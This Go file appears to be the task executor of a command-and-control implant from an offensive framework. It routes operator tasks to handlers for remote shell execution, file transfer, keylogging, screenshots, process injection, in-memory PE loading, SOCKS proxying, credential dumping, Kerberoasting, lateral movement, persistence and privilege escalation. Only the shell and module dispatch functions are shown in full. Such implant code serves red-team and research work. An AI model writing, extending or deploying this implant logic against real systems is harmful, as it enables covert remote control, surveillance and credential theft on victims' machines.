package tasks

import (
	"context"
	"fmt"
	"time"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"github.com/KKingZero/erebus-exploit-framwork/pkg/plugin"
	"google.golang.org/protobuf/proto"
)

// Executor routes tasks to the appropriate handler.
type Executor struct {
	Registry *plugin.Registry
}

func NewExecutor(registry *plugin.Registry) *Executor {
	return &Executor{Registry: registry}
}

const (
	maxTaskDataSize    = 10 << 20     // 10 MB max task data
	defaultTaskTimeout = 10 * time.Minute
)

func (e *Executor) Execute(task *pb.Task) *pb.TaskResult {
	start := time.Now()

	// Guard against oversized task payloads
	if len(task.Data) > maxTaskDataSize {
		return &pb.TaskResult{
			TaskId:          task.TaskId,
			Success:         false,
			Error:           fmt.Sprintf("task data too large: %d bytes (max %d)", len(task.Data), maxTaskDataSize),
			ExecutionTimeMs: time.Since(start).Milliseconds(),
		}
	}

	var data []byte
	var err error

	// Always set a timeout — use explicit if provided, otherwise default
	timeout := time.Duration(task.TimeoutMs) * time.Millisecond
	if timeout <= 0 || timeout > defaultTaskTimeout {
		timeout = defaultTaskTimeout
	}
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	switch task.TaskType {
	case pb.TaskType_TASK_SHELL:
		data, err = executeShell(ctx, task.Data)
	case pb.TaskType_TASK_EXIT:
		// Handled by beacon loop
		return &pb.TaskResult{
			TaskId:          task.TaskId,
			Success:         true,
			ExecutionTimeMs: time.Since(start).Milliseconds(),
		}
	case pb.TaskType_TASK_MODULE:
		data, err = e.executeModule(ctx, task.Data)
	case pb.TaskType_TASK_FILE_DOWNLOAD:
		data, err = executeFileDownload(ctx, task.Data)
	case pb.TaskType_TASK_FILE_UPLOAD:
		data, err = executeFileUpload(ctx, task.Data)
	case pb.TaskType_TASK_PROCESS_LIST:
		data, err = executeProcessList(ctx, task.Data)
	case pb.TaskType_TASK_PROCESS_KILL:
		data, err = executeProcessKill(ctx, task.Data)
	case pb.TaskType_TASK_NET_IFCONFIG:
		data, err = executeNetIfconfig(ctx, task.Data)
	case pb.TaskType_TASK_NET_PORTSCAN:
		data, err = executeNetPortscan(ctx, task.Data)
	case pb.TaskType_TASK_SCREENSHOT:
		data, err = executeScreenshot(ctx, task.Data)
	case pb.TaskType_TASK_KEYLOG_START:
		data, err = executeKeylogStart(ctx, task.Data)
	case pb.TaskType_TASK_KEYLOG_STOP:
		data, err = executeKeylogStop(ctx, task.Data)
	case pb.TaskType_TASK_KEYLOG_DUMP:
		data, err = executeKeylogDump(ctx, task.Data)
	case pb.TaskType_TASK_INJECT:
		data, err = executeInject(ctx, task.Data)
	case pb.TaskType_TASK_PE_LOAD:
		data, err = executePELoad(ctx, task.Data)
	case pb.TaskType_TASK_SOCKS_START:
		data, err = executeSocksStart(ctx, task.Data)
	case pb.TaskType_TASK_SOCKS_STOP:
		data, err = executeSocksStop(ctx, task.Data)
	case pb.TaskType_TASK_CREDS_DUMP,
		pb.TaskType_TASK_LDAP_ENUM,
		pb.TaskType_TASK_KERBEROAST,
		pb.TaskType_TASK_ASREPROAST,
		pb.TaskType_TASK_LATERAL_MOVE,
		pb.TaskType_TASK_PERSIST,
		pb.TaskType_TASK_PRIVESC:
		data, err = e.executeTypedModule(ctx, task.TaskType, task.Data)
	case pb.TaskType_TASK_PE_LOAD_EXEC:
		data, err = executePELoad(ctx, task.Data)
	default:
		err = fmt.Errorf("unsupported task type: %s", task.TaskType)
	}

	result := &pb.TaskResult{
		TaskId:          task.TaskId,
		Success:         err == nil,
		Data:            data,
		ExecutionTimeMs: time.Since(start).Milliseconds(),
	}
	if err != nil {
		result.Error = err.Error()
	}
	return result
}

func executeShell(ctx context.Context, data []byte) ([]byte, error) {
	shellTask := &pb.ShellTask{}
	if err := proto.Unmarshal(data, shellTask); err != nil {
		return nil, fmt.Errorf("unmarshal shell task: %w", err)
	}
	result := RunShell(ctx, shellTask.Command, shellTask.Args)
	return proto.Marshal(result)
}

func (e *Executor) executeModule(ctx context.Context, data []byte) ([]byte, error) {
	modTask := &pb.ModuleTask{}
	if err := proto.Unmarshal(data, modTask); err != nil {
		return nil, fmt.Errorf("unmarshal module task: %w", err)
	}
	return e.Registry.Execute(ctx, modTask.ModuleName, modTask.Config)
}
